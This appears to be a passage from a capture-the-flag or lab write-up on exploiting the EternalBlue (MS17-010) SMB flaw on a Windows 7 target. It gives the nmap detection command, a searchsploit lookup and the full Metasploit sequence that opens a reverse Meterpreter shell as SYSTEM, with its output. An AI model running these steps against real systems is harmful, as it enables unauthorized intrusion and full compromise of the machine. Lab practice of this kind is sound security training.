## Vulnerability Identification

### MS17-010 Confirmation

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.49.156.70
```

Result confirmed the machine is vulnerable to EternalBlue.

---

## Exploitation

### Searchsploit

```bash
searchsploit ms17-010
```

```
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | windows/remote/42031.py
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' (Metasploit)  | windows/remote/43970.rb
```

`.rb` = Metasploit module. `.py` = manual Python exploit.

### Metasploit

```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.49.156.70
set LHOST <tun0 IP>
run
```

**Why module 0 over module 10:**
- Module 0 (`ms17_010_eternalblue`) explicitly targets Windows 7
- Module 10 (`ms17_010_psexec`) uses PsExec style — extra steps, more failure points
- Always match exploit to exact OS version

### Result

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

EternalBlue is a kernel-level exploit — spawns directly as SYSTEM. No privilege escalation needed.

